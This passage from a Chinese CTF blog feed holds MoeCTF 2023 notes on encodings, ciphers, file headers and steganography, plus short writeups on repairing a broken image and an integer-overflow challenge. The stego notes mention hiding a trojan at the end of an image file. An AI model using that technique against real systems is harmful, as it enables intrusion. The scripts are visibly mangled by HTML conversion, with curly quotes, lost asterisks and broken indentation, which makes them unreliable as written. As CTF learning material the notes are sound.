href="https://blog.csdn.net/q20010619/article/details/120942973">https://blog.csdn.net/q20010619/article/details/120942973</a></p><p>感谢丁神的总结博客链接<br>常见编码</p><p>下面以加密下方flag为例</p><p>flag{QLNU_yyds!}</p><pre><code>1</code></pre><p>base家族</p><p>工具：base全家桶<a href="http://wiki.qlnuctf.cn/course/13/task/684/show">http://wiki.qlnuctf.cn/course/13/task/684/show</a><br>base16(十六进制)</p><p>666C61677B514C4E555F79796473217D</p><pre><code>1</code></pre><p>base32</p><p>MZWGCZ33KFGE4VK7PF4WI4ZBPU&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p><pre><code>1</code></pre><p>base58<br>base62</p><p><a href="http://decode-base62.nichabi.com/?input">http://decode-base62.nichabi.com/?input</a><br>base64</p><p>ZmxhZ3tRTE5VX3l5ZHMhfQ&#x3D;&#x3D;</p><pre><code>1</code></pre><p>base85</p><p>Ao(mgHVmI3&lt;F:#sA9&#x2F;oB</p><pre><code>1</code></pre><p>base91</p><p>@iH&lt;,{b*+6Gs1QejHEAL</p><pre><code>1</code></pre><p>base92</p><p>F#S&lt;YR]&#x3D;h7^%q3jIJN2g</p><pre><code>1</code></pre><p>base64x-转表base64</p><p>base64 的乱序版<br>参考链接</p><p>import base64<br>import string</p><p>str1 &#x3D; “x2dtJEOmyjacxDemx2eczT5cVS9fVUGvWTuZWjuexjRqy24rV29q”</p><p>string1 &#x3D; “ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+&#x2F;“<br>string2 &#x3D; “ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+&#x2F;“</p><p>print (base64.b64decode(str1.translate(str.maketrans(string1,string2))))</p><pre><code>123456789</code></pre><p>str1是要解密的代码<br>string1是改过之后的base64表<br>利用cyberchef 工具也是可以的<br>rot13<br>aes-des-3des-rc4-rabbit</p><p>需要密码，格式很像base，但是是以U2开头的</p><p>U2FsdGVkX1&#x2F;SvkGkNmN&#x2F;u52RqOQ&#x3D;</p><pre><code>1</code></pre><p>EBCBIC</p><p>啌亣捆咇凁攨mｐm檯剤仯蝠蝰?</p><pre><code>1</code></pre><p>使用010解密即可</p><p>flag{we1c0me_t0_redhat2021}</p><pre><code>1</code></pre><p>例题:2021红帽-签到<br>gzip</p><p>eJxLy0lMr05KSTEwM0pOTrFMNk9ONkhJNjYwNDI3SLVMSbJMMk5NrgUA9cQMNg&#x3D;&#x3D;</p><pre><code>1</code></pre><p>eJx开头的等号结尾的</p><p>网站解密:<a href="https://codebeautify.org/gzip-decompress-online">https://codebeautify.org/gzip-decompress-online</a><br>​<br>jwt</p><p>因为 jwt 分为三部分，之间通过点号分隔，前两部分就是 base64 编码的所以直接可以 base64 解码</p><p>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</p><pre><code>1</code></pre><p>辨别方法：eyJ</p><p>解密网站：<a href="https://jwt.io/">https://jwt.io/</a><br>希尔密码</p><p>码表</p><p>abcdefghijklmnopqrstuvwxyz ,.</p><pre><code>1</code></pre><p>常见密钥为一个网址，比如</p><p>在这里插入图片描述</p><p>解密网址:<a href="http://www.atoolbox.net/Tool.php?Id=914">http://www.atoolbox.net/Tool.php?Id=914</a><br>​<br>云影密码</p><p>有1，2，4，8这四个数字，可以通过加法来用这四个数字表示0-9中的任何一个数字，列如0&#x3D;28， 也就是0&#x3D;2+8，同理7&#x3D;124， 9&#x3D;18。这样之后再用1-26来表示26个英文字母，就有了密文与明文之间的对应关系。引入0来作为间隔，以免出现混乱。所以云影密码又叫“01248密码”</p><p>#!&#x2F;usr&#x2F;bin&#x2F;python</p><h1 id="coding-utf8"><a href="#coding-utf8" class="headerlink" title="-- coding&#x3D;utf8 --"></a>-<em>- coding&#x3D;utf8 -</em>-</h1><p>“””</p><h1 id="Author-pig"><a href="#Author-pig" class="headerlink" title="@Author : pig"></a>@Author : pig</h1><h1 id="CreatedTime-2019-11-2423-54-02"><a href="#CreatedTime-2019-11-2423-54-02" class="headerlink" title="@CreatedTime:2019-11-2423:54:02"></a>@CreatedTime:2019-11-2423:54:02</h1><h1 id="Description-https-www-jianshu-com-p-b5aa5cf60f83"><a href="#Description-https-www-jianshu-com-p-b5aa5cf60f83" class="headerlink" title="@Description : https://www.jianshu.com/p/b5aa5cf60f83"></a>@Description : <a href="https://www.jianshu.com/p/b5aa5cf60f83">https://www.jianshu.com/p/b5aa5cf60f83</a></h1><p>“””</p><p>def de_code(c):<br>    dic &#x3D; [chr(i) for i in range(ord(“A”), ord(“Z”) + 1)]<br>    flag &#x3D; []<br>    c2 &#x3D; [i for i in c.split(“0”)]<br>    for i in c2:<br>        c3 &#x3D; 0<br>        for j in i:<br>            c3 +&#x3D; int(j)<br>        flag.append(dic[c3 - 1])<br>    return flag</p><p>def encode(plaintext):<br>    dic &#x3D; [chr(i) for i in range(ord(“A”), ord(“Z”) + 1)]<br>    m &#x3D; [i for i in plaintext]<br>    tmp &#x3D; [];flag &#x3D; []<br>    for i in range(len(m)):<br>        for j in range(len(dic)):<br>            if m[i] &#x3D;&#x3D; dic[j]:<br>                tmp.append(j + 1)<br>    for i in tmp:<br>        res &#x3D; “”<br>        if i &gt;&#x3D; 8:<br>            res +&#x3D; int(i&#x2F;8)<em>“8”<br>        if i%8 &gt;&#x3D;4:<br>            res +&#x3D; int(i%8&#x2F;4)</em>“4”<br>        if i%4 &gt;&#x3D;2:<br>            res +&#x3D; int(i%4&#x2F;2)<em>“2”<br>        if i%2 &gt;&#x3D; 1:<br>            res +&#x3D; int(i%2&#x2F;1)</em>“1”<br>        flag.append(res + “0”)<br>    print (“”.join(flag)[:-1])</p><p>c &#x3D; input(“输入要解密的数字串:”)<br>print (de_code(c))<br>m_code &#x3D; input(“请输入要加密的数字串:”)<br>encode(m_code)</p><pre><code>123456789101112131415161718192021222324252627282930313233343536373839404142434445</code></pre><p>PGP词汇表</p><p>链接<a href="https://baike.baidu.com/item/PGP%E8%AF%8D%E6%B1%87%E8%A1%A8/22718129">https://baike.baidu.com/item/PGP%E8%AF%8D%E6%B1%87%E8%A1%A8/22718129</a><br>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-GQHdaRFc-1635086332410)(F:%5C_%E7%AC%94%E8%AE%B0%5Cmdpic%5C3.MISC%E6%80%BB%E7%BB%93_pic%5C1634728790155-d4c77211-966c-4707-b20b-8cf16fcc6845.jpeg)]<br>UUencode</p><p>Uuencode将输入资料以每三个字节为单位进行编码，如此重复进行。如果最后剩下的资料少于三个字节，不够的部份用零补齐，很像base64<br>特点：包含!”#￥%&amp;‘（）*+&#x3D;’” 等等字符<br>Unicode</p><p>Unicode 在一个字符集中包含了世界上所有文字和符号，统一编码，来终结不同编码产生乱码的问题</p><p>字符编码 UTF-8</p><p>Unicode 统一了所有字符的编码，是一个 Character Set，也就是字符集，字符集只是给所有的字符一个唯一编号，但是却没有规定如何存储</p><pre><code>一个字符使用四个字节存储，也就是 32 位，这样就能涵盖现有 Unicode 包含的所有字符，这种编码方式叫做 UTF-32（UTF 是 UCS Transformation Format 的缩写）在存储和网络传输中，通常使用更为节省空间的变长编码方式 UTF-8，UTF-8 代表 8 位一组表示 Unicode 字符的格式，使用 1 - 4 个字节来表示字符U+ 0000 ~ U+ 007F: 0XXXXXXXU+ 0080 ~ U+ 07FF: 110XXXXX 10XXXXXXU+ 0800 ~ U+ FFFF: 1110XXXX 10XXXXXX 10XXXXXXU+10000 ~ U+1FFFF: 11110XXX 10XXXXXX 10XXXXXX 10XXXXXX    1    2    3    4可以看到，UTF-8 通过开头的标志位位数实现了变长。对于单字节字符，只占用一个字节，实现了向下兼容 ASCII，并且能和 UTF-32 一样，包含 Unicode 中的所有字符，又能有效减少存储传输过程中占用的空间</code></pre><p>RTF格式下的unicode编码</p><p>明显特点：\u-65432?\u-65420</p><p>转换脚本</p><p>s&#x3D;r”\u-65432?\u-65420?\u-65420?\u-65424?\u-65421?\u-65478?\u-65489?\u-65489?\u-65418?\u-65426?\u-65437?\u-65420?\u-65434?\u-65491”<br>l&#x3D;list(s[3:-1].split(r”?\u-“))<br>flag&#x3D;””<br>for i in l:<br>    flag+&#x3D;chr(65536-int(i))<br>print(flag)</p><pre><code>123456</code></pre><p>autokey</p><p>自动密钥密码（Autokey Cipher）也是多表替换密码，与维吉尼亚密码密码类似，但使用不同的方法生成密钥。通常来说它要比维吉尼亚密码更安全。自动密钥密码主要有两种，关键词自动密钥密码和原文自动密钥密码<br>解密网站:<a href="https://www.wishingstarmoye.com/ctf/autokey">https://www.wishingstarmoye.com/ctf/autokey</a><br><a href="http://www.practicalcryptography.com/ciphers/autokey-cipher/">http://www.practicalcryptography.com/ciphers/autokey-cipher/</a></p><h1 id="python2-解码"><a href="#python2-解码" class="headerlink" title="python2 解码"></a>python2 解码</h1><p>from pycipher import Autokey</p><p>print Autokey(‘CULTURE’).encipher(‘helloworld’)<br>print Autokey(‘CULTURE’).decipher(‘jyweinsypo’)</p><pre><code>12345</code></pre><p>工具下载：<a href="https://github.com/hitcxy/break_autokey">https://github.com/hitcxy/break_autokey</a><br>工具使用</p><p>需要安装pycipher库 pip2 install pycipher<br>修改break_autokey.py中的’ctext’ 变量<br>python2 break_autokey.py</p><pre><code>123</code></pre><p>其他稀奇古怪编码</p><p><a href="https://www.dcode.fr/">https://www.dcode.fr/</a><br>可以用这个网站<br>特殊编程语言<br>JS变种</p><p>已下这些都是js，打开console运行一下就能得到flag<br>brainfuck</p><p><a href="http://www.hiencode.com/brain.html">http://www.hiencode.com/brain.html</a><br>jsfuck</p><p>用六个不同的符号</p><ul><li>!+<br>构造出JS的所有类型<br><a href="http://www.hiencode.com/jsfuck.html">http://www.hiencode.com/jsfuck.html</a><br>aaencode</li></ul><p>**也称颜文字 **ﾟωﾟﾉ&#x3D; &#x2F;｀ｍ´）ﾉ ~┻━┻ &#x2F;&#x2F;´∇｀&#x2F; [’_’]; o&#x3D;(ﾟｰﾟ)<br>将JS代码转换成常用的网络表情<br><a href="http://utf-8.jp/public/aaencode.html">http://utf-8.jp/public/aaencode.html</a><br>jjencode</p><p>demo地址<br><a href="http://utf-8.jp/public/jjencode.html">http://utf-8.jp/public/jjencode.html</a><br>xxencode<br>jother</p><p>jother是一种运用于javascript语言中利用少量字符构造精简的匿名函数方法对于字符串进行的编码方式。其中8个少量字符包括： ! + ( ) [ ] { } 。只用这些字符就能完成对任意字符串的编码。不同于jsfuck，它多了{}这两个大括号<br>解密工具 由于jother执行之后所得到的结果分为字符串和函数两种，所以解密的方法也不相同。<br>字符串：直接在Console界面中输入并回车即可<br>函数： 对于函数类型的jother加密结果，我们只需要将最后的()改成.toString()即可</p><p>ctf中js的总结<br>​<br>npiet</p><p>有关颜色的编程语言</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-uf50t0H3-1635086332411)(F:%5C_%E7%AC%94%E8%AE%B0%5Cmdpic%5C3.MISC%E6%80%BB%E7%BB%93_pic%5C1634640451368-b0297fe9-fed0-4432-94ee-2eb2af4bed01.png)]</p><p>更多查看<a href="https://www.jianshu.com/p/ed929cf72312">https://www.jianshu.com/p/ed929cf72312</a><br>​<br>ALPHUCK</p><p>字和符号，统一编码，来终结不同编码产生乱码的问题</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc-broken picture_2</title>
      <link href="/2023/10/05/ctfpic/"/>
      <url>/2023/10/05/ctfpic/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>又是一张打不开的图片，但这一次“牛头不对马嘴”，先导入winhex查看：<br><img src="/images/ctfpic2.JPG"></p><h1 id="png文件头"><a href="#png文件头" class="headerlink" title="png文件头"></a>png文件头</h1><p>检查发现是png的文件头：<br><img src="/images/ctfpic1.png"></p><h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><p>修改后将文件后缀改为png，打开获得flag：<br><img src="/images/ctfpicflag.png"><br>是马男波杰克！！！</p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.一开始被jpg的后缀骗了，卡了好久</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> Misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PWN-Int Overflow</title>
      <link href="/2023/10/03/pwnintof/"/>
      <url>/2023/10/03/pwnintof/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>nc连接后回显题目信息：<br><img src="/images/pwnintof1.JPG"><br>要求我们输入一个数，要令这个数没有负号但等于-114514</p><h1 id="整形溢出"><a href="#整形溢出" class="headerlink" title="整形溢出"></a>整形溢出</h1><p>根据题目信息，可以知道变量n是整形变量，c语言中整形变量的取值范围是-2 147 483 648到 2 147 483 647，当我们输入的数超过最大值时，程序会自动回滚到最小值，比如，当我们输入2 147 483 648时，我们实际上向变量存储了-2 147 483 648这个值（就像跳绳的计数器一样），所以我们要输入-114514，只需要输入更大的数，让其回滚到-114514即可</p><h1 id="获得flag"><a href="#获得flag" class="headerlink" title="获得flag"></a>获得flag</h1><p>根据上面的思路，输入4 294 852 782即可：<br><img src="/images/pwnintofflag.JPG"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.一开始不知道int有范围限制，还能回滚，导致题目做不出来</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 2023MoeCTF </category>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Misc-bronken picture_1</title>
      <link href="/2023/10/03/miscpic/"/>
      <url>/2023/10/03/miscpic/</url>
      
        <content type="html"><![CDATA[<h1 id="题目简述"><a href="#题目简述" class="headerlink" title="题目简述"></a>题目简述</h1><p>题目为打不开的图片，下载附件后用winhex打开：<br><img src="/images/miscpic1.JPG"><br>发现是一个图片文件，有exif信息但是无法打开</p><h1 id="文件头"><a href="#文件头" class="headerlink" title="文件头"></a>文件头</h1><p>上网搜索相关信息，发现一种修改文件头的题型，检查发现图片的文件尾是jpeg图片的文件尾，但文件头经过修改，将文件头修改为jpeg的可以打开图片：<br><img src="/images/miscpic2.JPG"><br><img src="/images/miscpic3.JPG"><br>是一张西电的风景图</p><h1 id="获取flag"><a href="#获取flag" class="headerlink" title="获取flag"></a>获取flag</h1><p>查看文件属性，发现有flag的提示：<br><img src="/images/miscpic4.JPG"><br>猜测是hex格式的flag，进行hex转字符后得到flag：<br><img src="/images/miscpicflag.JPG"></p><h1 id="踩坑总结"><a href="#踩坑总结" class="headerlink" title="踩坑总结"></a>踩坑总结</h1><p>1.第一次做做到解密flag的时候卡住了，不知道这是hex码，以后知道了<br>2.附上关于文件头隐写的知识：<br>常见文件文件头和隐写术总结 CTF中Misc必备<br>前言</p><p>对常见文件文件头和隐写术做个归纳总结</p><pre><code>文件头文件尾图片隐写音频隐写电子文档隐写</code></pre><p>一、文件头文件尾<br>1、图片</p><pre><code>JPEG文件头：FF D8 FF 文件尾：FF D9TGA未压缩的前4字节 00 00 02 00RLE压缩的前5字节 00 00 10 00 00PNG文件头：89 50 4E 47 0D 0A 1A 0A 文件尾：AE 42 60 82GIF文件头：47 49 46 38 39(37) 61 文件尾：00 3BBMP文件头：42 4D文件头标识(2 bytes) 42(B) 4D(M)TIFF (tif)文件头：49 49 2A 00ico文件头：00 00 01 00Adobe Photoshop (psd)文件头：38 42 50 53</code></pre><p>2、office文件</p><pre><code>MS Word/Excel (xls.or.doc)文件头：D0 CF 11 E0MS Access (mdb)文件头：53 74 61 6E 64 61 72 64 20 4AWordPerfect (wpd)文件头：FF 57 50 43Adobe Acrobat (pdf)文件头：25 50 44 46 2D 31 2Eapplication/vnd.visio(vsd)文件头：D0 CF 11 E0 A1 B1 1A E1Email [thorough only] (eml)文件头：44 65 6C 69 76 65 72 79 2D 64 61 74 65 3AOutlook Express (dbx)文件头：CF AD 12 FE C5 FD 74 6FOutlook (pst)文件头：21 42 44 4ERich Text Format (rtf)文件头：7B 5C 72 74 66txt 文件(txt)文件头：Unicode：FE FF / Unicode big endian：FF FE / UTF-8：EF BB BF /ANSI编码是没有文件头的</code></pre><p>3、压缩包文件</p><pre><code>ZIP Archive (zip)文件头：50 4B 03 04文件尾：50 4BRAR Archive (rar)文件头：52 61 72 21</code></pre><p>4、音频文件</p><pre><code>Wave (wav)文件头：57 41 56 45audio(Audio)文件头： 4D 54 68 64audio/x-aac（aac）文件头：FF F1(9)</code></pre><p>5、视频文件</p><pre><code>AVI (avi)文件头：41 56 49 20Real Audio (ram)文件头：2E 72 61 FDReal Media (rm)文件头：2E 52 4D 46MPEG (mpg)文件头：00 00 01 BA(3)Quicktime (mov)文件头：6D 6F 6F 76Windows Media (asf)文件头：30 26 B2 75 8E 66 CF 11MIDI (mid)文件头：4D 54 68 64</code></pre><p>6、代码文件</p><pre><code>XML (xml)文件头：3C 3F 78 6D 6CHTML (html)文件头：68 74 6D 6C 3EQuicken (qdf)文件头：AC 9E BD 8FWindows Password (pwl)文件头：E3 82 85 96</code></pre><p>7、其他类型</p><pre><code>windows证书文件(der)文件头：30 82 03 C9CAD (dwg)文件头：41 43 31 30Windows Shortcut (lnk)文件头：4C 00 00 00Windows reg(reg)文件头：52 45 47 45 44 49 54 34</code></pre><p>二、图片隐写<br>1、附加式的图片隐写</p><p>操作系统识别，从文件头标志，到文件的结束标志位<br>当系统识别到图片的结束标志位后，默认是不再继续识别的<br>所以可以在文件尾后面加东西<br>（1）附加字符串</p><p>最简单的是附加字符串</p><p>附加方法</p><pre><code>winhex直接附加再保存copy /b a.jpg+b.txt c.jpg，在a图片里加b的内容，得到c图片</code></pre><p>识别方法</p><pre><code>winhex直接看notepad也可以看linux的strings指令</code></pre><p>应用</p><pre><code>制作图片马，即把木马放到图片的最后</code></pre><p>实例</p><pre><code>Aesop_secretTraining-Stegano-1</code></pre><p>（2）隐藏压缩文件</p><p>可以把压缩文件藏在图片文件尾后<br>看起来还是图片</p><p>附加方法</p><pre><code>winhex直接附加再保存</code></pre><p>识别方法</p><pre><code>有些直接改扩展名就可以用linux的binwalk指令stegsolve分离winhex复制压缩文件内容重新保存</code></pre><p>实例</p><pre><code>a_good_idea攻防世界 Misc高手进阶区 2分题 Ditf攻防世界 Misc高手进阶区 2分题 再见李华攻防世界 Misc高手进阶区 3分题 miscmisc攻防世界 Misc高手进阶区 3分题 3-11</code></pre><p>2、基于文件结构的图片隐写</p><p>主要是针对PNG图片</p><p>标准的PNG文件结构应包括：</p><pre><code>PNG文件标志PNG数据块：关键数据块和辅助数据块，其中正常的关键数据块有长度、数据块类型码、数据块数据和CRC这4种</code></pre><p>（1）png图片文件头数据块（IHDR）</p><p>PNG图片的第一个数据块</p><pre><code>一张PNG图片仅有一个IHDR数据块包括了图片的宽，高，图像深度，颜色类型，压缩方法等信息</code></pre><p>蓝色部分就是IHDR</p><p>可以修改高度值或宽度值对部分信息进行隐藏</p><pre><code>如果图片原本是800(宽)*600(高)，然后图片的高度从600变成500这样下面800×100区域的信息就无法从图片中显示出来，我们可见的只有上方800*500的区域，这样就达成了图片隐写的目的同理可知图片的宽度也可以进行类似的修改以达到隐藏信息的目的</code></pre><p>识别方法</p><pre><code>用winhex或者010Editor等编辑器打开图片修改长度或宽度值在修改文件后，需要利用CRC Calculator对CRC校验码进行重新计算赋值，以防图片被修改后，自身的CRC校验报错，导致图片不能正常打开</code></pre><p>实例</p><pre><code>攻防世界 Misc高手进阶区 2分题 Ditf攻防世界 Misc高手进阶区 3分题 2-1</code></pre><p>（2）IDAT 数据块</p><pre><code>存储实际的数据在数据流中可包含多个连续顺序的图像数据块写入一个多余的IDAT也不会多大影响肉眼对图片的观察</code></pre><p>识别方法</p><pre><code>用pngcheck对图片进行检测pngcheck -v hidden.png</code></pre><p>可能会出现一个size为0的异常块</p><p>提取内容的脚本</p><p>#!&#x2F;usr&#x2F;bin&#x2F;python</p><p>from struct import unpack<br>from binascii import hexlify, unhexlify<br>import sys, zlib</p><h1 id="Returns-Position-Chunk-Size-Chunk-Type-Chunk-Data-Chunk-CRC"><a href="#Returns-Position-Chunk-Size-Chunk-Type-Chunk-Data-Chunk-CRC" class="headerlink" title="Returns [Position, Chunk Size, Chunk Type, Chunk Data, Chunk CRC]"></a>Returns [Position, Chunk Size, Chunk Type, Chunk Data, Chunk CRC]</h1><p>def getChunk(buf, pos):<br>    a &#x3D; []<br>    a.append(pos)<br>    size &#x3D; unpack(‘!I’, buf[pos:pos+4])[0]<br>    # Chunk Size<br>    a.append(buf[pos:pos+4])<br>    # Chunk Type<br>    a.append(buf[pos+4:pos+8])<br>    # Chunk Data<br>    a.append(buf[pos+8:pos+8+size])<br>    # Chunk CRC<br>    a.append(buf[pos+8+size:pos+12+size])<br>    return a</p><p>def printChunk(buf, pos):<br>    print ‘Pos : ‘+str(pos)+’’<br>    print ‘Type: ‘ + str(buf[pos+4:pos+8])<br>    size &#x3D; unpack(‘!I’, buf[pos:pos+4])[0]<br>    print ‘Size: ‘ + str(size)<br>    #print ‘Cont: ‘ + str(hexlify(buf[pos+8:pos+8+size]))<br>    print ‘CRC : ‘ + str(hexlify(buf[pos+size+8:pos+size+12]).upper())<br>    print</p><p>if len(sys.argv)!&#x3D;2:<br>    print ‘Usage: .&#x2F;this Stegano_PNG’<br>    sys.exit(2)</p><p>buf &#x3D; open(sys.argv[1]).read()<br>pos&#x3D;0</p><p>print “PNG Signature: “ + str(unpack(‘cccccccc’, buf[pos:pos+8]))<br>pos+&#x3D;8</p><p>chunks &#x3D; []<br>for i in range(3):<br>    chunks.append(getChunk(buf, pos))<br>    printChunk(buf, pos)<br>    pos+&#x3D;unpack(‘!I’,chunks[i][1])[0]+12</p><p>decompressed &#x3D; zlib.decompress(chunks[1][3])</p><h1 id="Decompressed-data-length-height-x-width-3-1"><a href="#Decompressed-data-length-height-x-width-3-1" class="headerlink" title="Decompressed data length &#x3D; height x (width * 3 + 1)"></a>Decompressed data length &#x3D; height x (width * 3 + 1)</h1><p>print “Data length in PNG file : “, len(chunks[1][3])<br>print “Decompressed data length: “, len(decompressed)</p><p>height &#x3D; unpack(‘!I’,(chunks[0][3][4:8]))[0]<br>width &#x3D; unpack(‘!I’,(chunks[0][3][:4]))[0]<br>blocksize &#x3D; width * 3 + 1<br>filterbits &#x3D; ‘’<br>for i in range(0,len(decompressed),blocksize):<br>    bit &#x3D; unpack(‘2401c’, decompressed[i:i+blocksize])[0]<br>    if bit &#x3D;&#x3D; ‘\x00’: filterbits+&#x3D;’0’<br>    elif bit &#x3D;&#x3D; ‘\x01’: filterbits+&#x3D;’1’<br>    else:<br>        print ‘Bit is not 0 or 1… Default is 0 - MAGIC!’<br>        sys.exit(3)</p><p>s &#x3D; filterbits<br>endianess_filterbits &#x3D; [filterbits[i:i+8][::-1] for i in xrange(0, len(filterbits), 8)]</p><p>flag &#x3D; ‘’<br>for x in endianess_filterbits:<br>    if x&#x3D;&#x3D;’00000000’: break<br>    flag +&#x3D; unhexlify(‘%x’ % int(‘0b’+str(x), 2))</p><p>print ‘Flag: ‘ + flag</p><p>3、LSB隐写</p><p>LSB，最低有效位，英文是Least Significant Bit</p><pre><code>容量大、嵌入速度快、对载体图像质量影响小在PNG和BMP上可以实现</code></pre><p>原理</p><pre><code>图片中的像素一般是由三种颜色组成，即三原色(红绿蓝)，由这三种原色可以组成其他各种颜色在png图片的存储中,每个颜色占有8bit,即有256种颜色，一共包含256的三次方颜色，即16777216种颜色人类的眼睛可以区分约1,000万种不同的颜色，剩下无法区分的颜色就有6777216LSB隐写就是修改了像素中的最低位，把一些信息隐藏起来</code></pre><p>给个直观例子</p><p>这人眼看不出颜色区别，但最低位不一样</p><p>嵌入脚本</p><p>from PIL import Image<br>import math</p><p>class LSB:<br>  def <strong>init</strong>(self):<br>    self.im&#x3D;None</p><p>  def load_bmp(self,bmp_file):<br>    self.im&#x3D;Image.open(bmp_file)<br>    self.w,self.h&#x3D;self.im.size<br>    self.available_info_len&#x3D;self.w*self.h # 不是绝对可靠的<br>    print (“Load&gt;&gt; 可嵌入”,self.available_info_len,”bits的信息”)</p><p>  def write(self,info):<br>    “””先嵌入信息的长度，然后嵌入信息”””<br>    info&#x3D;self._set_info_len(info)<br>    info_len&#x3D;len(info)<br>    info_index&#x3D;0<br>    im_index&#x3D;0<br>    while True:<br>      if info_index&gt;&#x3D;info_len:<br>        break<br>      data&#x3D;info[info_index]<br>      x,y&#x3D;self._get_xy(im_index)<br>      self._write(x,y,data)<br>      info_index+&#x3D;1<br>      im_index+&#x3D;1</p><p>  def save(self,filename):<br>    self.im.save(filename)</p><p>  def read(self):<br>    “””先读出信息的长度，然后读出信息”””<br>    _len,im_index&#x3D;self._get_info_len()<br>    info&#x3D;[]<br>    for i in range(im_index,im_index+_len):<br>      x,y&#x3D;self._get_xy(i)<br>      data&#x3D;self._read(x,y)<br>      info.append(data)<br>    return info</p><p>  #&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;#<br>  def _get_xy(self,l):<br>    return l%self.w,int(l&#x2F;self.w)</p><p>  def _set_info_len(self,info):<br>    l&#x3D;int(math.log(self.available_info_len,2))+1<br>    info_len&#x3D;[0]*l<br>    _len&#x3D;len(info)<br>    info_len[-len(bin(_len))+2:]&#x3D;[int(i) for i in bin(_len)[2:]]<br>    return info_len+info</p><p>  def _get_info_len(self):<br>    l&#x3D;int(math.log(self.w*self.h,2))+1<br>    len_list&#x3D;[]<br>    for i in range(l):<br>      x,y&#x3D;self._get_xy(i)<br>      _d&#x3D;self._read(x,y)<br>      len_list.append(str(_d))<br>    _len&#x3D;’’.join(len_list)<br>    _len&#x3D;int(_len,2)<br>    return _len,l</p><p>  def _write(self,x,y,data):<br>    origin&#x3D;self.im.getpixel((x,y))<br>    lower_bit&#x3D;origin%2<br>    if lower_bit&#x3D;&#x3D;data:<br>      pass<br>    elif (lower_bit,data) &#x3D;&#x3D; (0,1):<br>      self.im.putpixel((x,y),origin+1)<br>    elif (lower_bit,data) &#x3D;&#x3D; (1,0):<br>      self.im.putpixel((x,y),origin-1)</p><p>  def _read(self,x,y):<br>    data&#x3D;self.im.getpixel((x,y))<br>    return data%2</p><p>if <strong>name</strong>&#x3D;&#x3D;”<strong>main</strong>“:<br>  lsb&#x3D;LSB()</p><h1 id="写"><a href="#写" class="headerlink" title="写"></a>写</h1><p>  lsb.load_bmp(‘test.bmp’)<br>  info1&#x3D;[0,1,0,1,1,0,1,0]<br>  lsb.write(info1)<br>  lsb.save(‘lsb.bmp’)</p><h1 id="读"><a href="#读" class="headerlink" title="读"></a>读</h1><p>  lsb.load_bmp(‘lsb.bmp’)<br>  info2&#x3D;lsb.read()<br>  print (info2)</p><p>识别方法</p><pre><code>stegsolve，调通道zsteg，神一样的工具</code></pre><p>提取脚本</p><p>from PIL import Image</p><p>im &#x3D; Image.open(“extracted.bmp”)<br>pix &#x3D; im.load()<br>width, height &#x3D; im.size</p><p>extracted_bits &#x3D; []<br>for y in range(height):<br>    for x in range(width):<br>        r, g, b &#x3D; pix[(x,y)]<br>        extracted_bits.append(r &amp; 1)<br>        extracted_bits.append(g &amp; 1)<br>        extracted_bits.append(b &amp; 1)</p><p>extracted_byte_bits &#x3D; [extracted_bits[i:i+8] for i in range(0, len(extracted_bits), 8)]<br>with open(“extracted2.bmp”, “wb”) as out:<br>    for byte_bits in extracted_byte_bits:<br>                byte_str &#x3D; ‘’.join(str(x) for x in byte_bits)<br>        byte &#x3D; chr(int(byte_str, 2))<br>        out.write(byte)</p><p>实例</p><pre><code>pure_color攻防世界 Misc高手进阶区 2分题 stage1攻防世界 Misc高手进阶区 2分题 打野攻防世界 Misc高手进阶区 2分题 倒立屋攻防世界 Misc高手进阶区 2分题 Erik-Baleog-and-Olaf攻防世界 Misc高手进阶区 3分题 flag_universe攻防世界 Misc高手进阶区 3分题 Excaliflag</code></pre><p>4、基于DCT域的JPG图片隐写</p><p>JPEG图像格式使用离散余弦变换（Discrete Cosine Transform，DCT）函数来压缩图像</p><pre><code>通过识别每个8×8像素块中相邻像素中的重复像素来减少显示图像所需的位数使用近似估算法降低其冗余度有损压缩（Loss 